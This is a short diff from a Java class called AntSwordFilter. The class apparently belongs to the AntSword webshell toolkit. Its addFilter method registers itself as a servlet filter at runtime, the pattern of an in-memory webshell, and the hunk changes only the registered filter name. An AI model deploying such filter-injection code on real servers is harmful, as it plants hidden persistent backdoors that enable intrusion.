@@ -95,7 +95,7 @@ public final class AntSwordFilter extends ClassLoader implements Filter {
     public String addFilter() throws Exception {
         ServletContext servletContext = this.request.getServletContext();
         Filter filter = this;
-        String filterName = this.path;
+        String filterName = "AntSwordFilter" + this.path;
         String url = this.path;
 
         Field contextField = null;
